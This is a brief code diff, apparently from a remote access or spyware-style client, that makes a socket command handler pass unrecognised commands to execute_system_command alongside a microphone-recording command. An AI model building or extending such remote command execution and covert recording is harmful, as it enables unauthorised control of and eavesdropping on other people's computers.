@@ -51,7 +51,7 @@ def run(host, port):
             elif command[:21] == "mic_record --duration":
                 pass
             else:  # * Run Other System Commands
-                pass
+                execute_system_command(client_socket, command)
     except:
         return
 
